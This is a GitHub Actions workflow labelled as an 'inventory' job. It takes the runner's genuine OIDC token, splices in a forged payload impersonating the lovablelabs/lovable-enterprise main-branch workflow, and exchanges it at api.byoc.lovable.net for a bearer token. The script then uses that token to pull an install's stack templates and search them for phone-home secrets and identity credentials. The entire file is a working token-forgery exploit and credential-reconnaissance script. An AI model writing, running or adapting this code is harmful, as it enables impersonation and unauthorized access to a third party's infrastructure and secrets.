name: phonehome-inventory
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inventory:
    runs-on: ubuntu-latest
    steps:
      - name: Inspect phone-home generation and rollout state
        shell: bash
        run: |
          set -euo pipefail
          org='orgl9cvkaqh1g8yv2jqdb19247'
          install='inlkuvvc4e3mdxznfis5xc6v60'
          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
          request="$(python3 - <<'PY'
          import base64,json,os
          h,p,s=os.environ['REAL_TOKEN'].split('.')
          fake={'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net','sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main','repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944','repository_owner':'lovablelabs','repository_owner_id':'148472368','repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push','workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main','job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main'}
          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
          forged=json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))
          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':forged},separators=(',',':')))
          PY
          )"
          token="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request" | jq -r .token)"
          stack="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$install/stack" -H "Authorization: Bearer $token" -H "X-Nuon-Org-ID: $org")"
          jq -c '{keys:keys,version_count:(.versions|length)}' <<<"$stack"

          jq -r '.versions[]? | [.id, (.status.status // ""), (.template_url // "")] | @tsv' <<<"$stack" | while IFS=$'\t' read -r version status template; do
            test -n "$template" || continue
            code="$(curl -sS -o /tmp/stack-template -w '%{http_code}' "$template")"
            test "$code" = 200 || continue
            has_phonehome_url=false
            has_token_auth=false
            has_identity_auth=false
            grep -q '/phone-home/' /tmp/stack-template && has_phonehome_url=true
            grep -Eqi 'phone.home.token|phone_home_token|phone-home/.+secret|secretsmanager' /tmp/stack-template && has_token_auth=true
            grep -Eqi 'phone.home.identity|phone_home_identity|managedidentity/userassignedidentities' /tmp/stack-template && has_identity_auth=true
            jq -nc --arg version "$version" --arg status "$status" --argjson public true --argjson phonehome "$has_phonehome_url" --argjson token_auth "$has_token_auth" --argjson identity_auth "$has_identity_auth" '{version_id:$version,status:$status,public_template:$public,phone_home_url:$phonehome,token_auth_material:$token_auth,identity_auth_material:$identity_auth}'
          done
